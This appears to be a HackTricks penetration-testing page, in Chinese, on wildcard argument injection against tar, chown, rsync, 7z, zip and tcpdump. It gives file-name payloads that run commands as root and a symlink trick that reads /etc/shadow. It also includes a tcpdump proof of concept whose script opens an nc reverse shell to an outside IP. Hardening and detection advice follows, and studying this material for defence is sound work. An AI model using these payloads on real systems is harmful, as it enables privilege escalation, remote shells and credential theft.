# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> 通配符（又称 *glob*）**参数注入**发生在特权脚本运行 Unix 二进制文件，如 `tar`、`chown`、`rsync`、`zip`、`7z` 等，使用未加引号的通配符，如 `*`。  
> 由于 shell 在执行二进制文件之前会扩展通配符，因此能够在工作目录中创建文件的攻击者可以构造以 `-` 开头的文件名，使其被解释为 **选项而不是数据**，有效地走私任意标志或甚至命令。  
> 本页面收集了 2023-2025 年最有用的原语、最新研究和现代检测。

## chown / chmod

您可以通过滥用 `--reference` 标志来**复制任意文件的所有者/组或权限位**：
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
当 root 后来执行类似的操作时：
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` 被注入，导致 *所有* 匹配的文件继承 `/root/secret``file` 的所有权/权限。

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (组合攻击)。  
另请参阅经典的 DefenseCode 论文以获取详细信息。

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

通过滥用 **checkpoint** 功能执行任意命令：
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
一旦 root 运行 e.g. `tar -czf /root/backup.tgz *`，`shell.sh` 作为 root 被执行。

### bsdtar / macOS 14+

最近的 macOS 上默认的 `tar`（基于 `libarchive`）*不*实现 `--checkpoint`，但你仍然可以通过 **--use-compress-program** 标志实现代码执行，该标志允许你指定一个外部压缩程序。
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
当特权脚本运行 `tar -cf backup.tar *` 时，将启动 `/bin/sh`。

---

## rsync

`rsync` 允许您通过以 `-e` 或 `--rsync-path` 开头的命令行标志覆盖远程 shell 或甚至远程二进制文件：
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
如果 root 后来使用 `rsync -az * backup:/srv/` 归档目录，注入的标志会在远程端生成你的 shell。

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` 模式)。

---

## 7-Zip / 7z / 7za

即使特权脚本 *防御性* 地用 `--` 前缀添加通配符（以停止选项解析），7-Zip 格式通过用 `@` 前缀文件名支持 **文件列表文件**。将其与符号链接结合可以让你 *外泄任意文件*：
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
如果root执行类似于：
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip 将尝试将 `root.txt` (→ `/etc/shadow`) 作为文件列表读取，并将退出，**将内容打印到 stderr**。

---

## zip

`zip` 支持标志 `--unzip-command`，该标志在测试归档时会*逐字*传递给系统 shell：
```bash
zip result.zip files -T --unzip-command "sh -c id"
```
通过精心制作的文件名注入标志，并等待特权备份脚本在生成的文件上调用 `zip -T`（测试归档）。

---

## 额外的易受通配符注入影响的二进制文件（2023-2025 快速列表）

以下命令在现代 CTF 和真实环境中被滥用。有效载荷始终作为一个 *文件名* 创建在一个可写目录中，稍后将通过通配符处理：

| 二进制文件 | 滥用的标志 | 效果 |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → 任意 `@file` | 读取文件内容 |
| `flock` | `-c <cmd>` | 执行命令 |
| `git`   | `-c core.sshCommand=<cmd>` | 通过 SSH 执行 git 命令 |
| `scp`   | `-S <cmd>` | 生成任意程序而不是 ssh |

这些原语不如 *tar/rsync/zip* 经典常见，但在狩猎时值得检查。

---

## tcpdump 轮换钩子 (-G/-W/-z)：通过 argv 注入在包装器中实现 RCE

当受限的 shell 或供应商包装器通过连接用户控制的字段（例如，“文件名”参数）构建 `tcpdump` 命令行时，如果没有严格的引用/验证，您可以偷偷注入额外的 `tcpdump` 标志。`-G`（基于时间的轮换）、`-W`（限制文件数量）和 `-z <cmd>`（后轮换命令）的组合会导致以运行 tcpdump 的用户身份（通常是设备上的 root）执行任意命令。

前提条件：

- 您可以影响传递给 `tcpdump` 的 `argv`（例如，通过像 `/debug/tcpdump --filter=... --file-name=<HERE>` 的包装器）。
- 包装器不清理文件名字段中的空格或以 `-` 开头的标记。

经典 PoC（从可写路径执行反向 shell 脚本）：
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
细节：

- `-G 1 -W 1` 强制在第一个匹配的数据包后立即旋转。
- `-z <cmd>` 在每次旋转后运行后旋转命令。许多构建执行 `<cmd> <savefile>`。如果 `<cmd>` 是脚本/解释器，请确保参数处理与您的有效负载匹配。

不可移动媒体变体：

- 如果您有其他原始方法来写入文件（例如，允许输出重定向的单独命令包装器），将您的脚本放入已知路径并触发 `-z /bin/sh /path/script.sh` 或 `-z /path/script.sh`，具体取决于平台语义。
- 一些供应商包装器旋转到攻击者可控的位置。如果您可以影响旋转路径（符号链接/目录遍历），您可以引导 `-z` 执行您完全控制的内容，而无需外部媒体。

供应商的加固建议：

- 切勿直接将用户控制的字符串传递给 `tcpdump`（或任何工具），而不使用严格的允许列表。引用并验证。
- 不要在包装器中暴露 `-z` 功能；使用固定的安全模板运行 tcpdump，并完全禁止额外标志。
- 降低 tcpdump 权限（仅限 cap_net_admin/cap_net_raw）或在具有 AppArmor/SELinux 限制的专用非特权用户下运行。

## 检测与加固

1. **在关键脚本中禁用 shell 通配符**：`set -f` (`set -o noglob`) 防止通配符扩展。
2. **引用或转义** 参数：`tar -czf "$dst" -- *` 是 *不安全的* — 更倾向于使用 `find . -type f -print0 | xargs -0 tar -czf "$dst"`。
3. **显式路径**：使用 `/var/www/html/*.log` 而不是 `*`，以便攻击者无法创建以 `-` 开头的兄弟文件。
4. **最小权限**：尽可能以非特权服务帐户而不是 root 运行备份/维护作业。
5. **监控**：Elastic 的预构建规则 *通过通配符注入的潜在 Shell* 查找 `tar --checkpoint=*`、`rsync -e*` 或 `zip --unzip-command` 后面紧跟着一个 shell 子进程。EQL 查询可以适应其他 EDR。

---

## 参考文献

* Elastic Security – 检测到的通过通配符注入的潜在 Shell 规则（最后更新于 2025 年）
* Rutger Flohil – “macOS — Tar 通配符注入”（2024 年 12 月 18 日）
* GTFOBins – [tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
* FiberGateway GR241AG – [完整利用链](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
